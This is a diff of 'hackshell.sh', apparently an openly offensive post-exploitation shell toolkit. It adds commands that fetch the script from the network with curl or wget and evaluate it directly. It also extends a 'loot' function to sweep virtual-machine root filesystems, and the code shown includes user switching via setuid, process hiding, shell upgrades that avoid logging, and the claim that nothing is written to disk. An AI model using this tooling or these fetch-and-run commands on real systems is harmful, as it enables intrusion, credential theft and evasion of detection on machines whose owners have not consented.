@@ -13,6 +13,8 @@
 #     source <(curl -SsfL https://thc.org/hs)
 #     source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
 #     source <(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
+#     eval  "$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
+#     eval  "$(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
 #
 # Environment variables (optional):
 #    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
@@ -140,7 +142,7 @@ xsu() {
     h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)"
     # Not all systems support unset -n
     # unset -n _HS_HOME_ORIG
-    [ $# -le 0 ] && echo >&2 -e "May need to cut & paste: ' ${CDC}source <(curl -SsfL ${_HSURL})${CN}'"
+    [ $# -le 0 ] && echo >&2 -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
     bak="$_HS_HOME_ORIG"
     unset _HS_HOME_ORIG
     LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});${pcmd}"
@@ -166,7 +168,7 @@ xssh() {
     }
     # If we use key then disable Password auth ('-oPasswordAuthentication=no' is not portable)
     { [[ "$*" == *" -i"* ]] || [[ "$*" == "-i"* ]]; } && opts+=("-oBatchMode=yes")
-    echo -e "May need to cut & paste: ' ${CDC}source <(curl -SsfL ${_HSURL})${CN}'"
+    echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
@@ -590,7 +592,7 @@ np() {
 zapme() {
     local name="${1}"
     _hs_dep zapper || return
-    HS_WARN "Starting new/zap'ed shell. Type '${CDC} source <(curl -SsfL https://thc.org/hs)${CDM}' again."
+    HS_WARN "Starting new/zap'ed shell. Type '${CDC} eval \"\$(curl -SsfL ${_HSURL})\"${CDM}' again."
     [ -z "$name" ] && {
         HS_INFO "Apps will hide as ${CDY}python${CDM}. Use ${CDC}zapme -${CDM} for NO name."
         name="python"
@@ -1369,7 +1371,10 @@ loot() {
 
     lootlight
     unset HOMEDIRARR
-    echo -e "${CW}TIP:${CN} Type ${CDC}lootmore${CN} to loot even more."
+    [ -z "$ROOTFS" ] && {
+        echo -e "${CW}TIP:${CN} Type ${CDC}lootmore${CN} to loot even more."
+        [ -d "/vz/root" ] && echo -e "${CW}VMs found${CN}: Try ${CDC}"'for x in /vz/root/*; do ROOTFS="$x" loot; done'"${CN}"
+    }
 }
 
 # Try to find LPE
@@ -1426,15 +1431,15 @@ _hs_try_resize() {
 }
 
 _hs_mk_pty() {
-    echo -e "${CDM}Upgrading to PTY Shell${CN}"
+    echo -e "${CDM}Upgrading to PTY Shell${CN}${CF}
+[Press Ctrl-c now and set ${CDC}${CF}export NOPTY=1${CN}${CF}]${CN} otherwise"
     echo -e ">>> Press ${CDC}Ctrl-z${CN} now and cut & paste ${CDC}stty raw -echo icrnl opost; fg${CN}"
     echo -e ">>> ${CG}AFTERWARDS${CDG}, Press enter to continue"
     read -r
-    echo -e ">>> Cut & paste ${CDC} source <(curl -SsfL https://thc.org/hs)${CN}${CF}
-[If this is not what you want then please start again with ${CDC}${CF}export NOPTY=1${CN}${CF}]${CN}"
+    echo -e ">>> Cut & paste ${CDC} source <(curl -SsfL https://thc.org/hs)${CN}"
 
     if [ -n "$HS_PY" ]; then
-        exec "${HS_PY:-python}" -c "import pty; pty.spawn('${SHELL:-sh}')"
+        "${HS_PY:-python}" -c "import pty;" 2>/dev/null && exec "${HS_PY:-python}" -c "import pty; pty.spawn('${SHELL:-sh}')"
     elif command -v script >/dev/null; then
         exec script -qc "${SHELL:-sh}" /dev/null
     fi
@@ -1790,7 +1795,7 @@ echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN
 echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
 
 # Warning if thc.org is used
-[ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}source <(curl -SsfL ${_HSURL})${CDM}'${CN}"
+[ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"
 
 ### Check for obvious loots
 lootlight
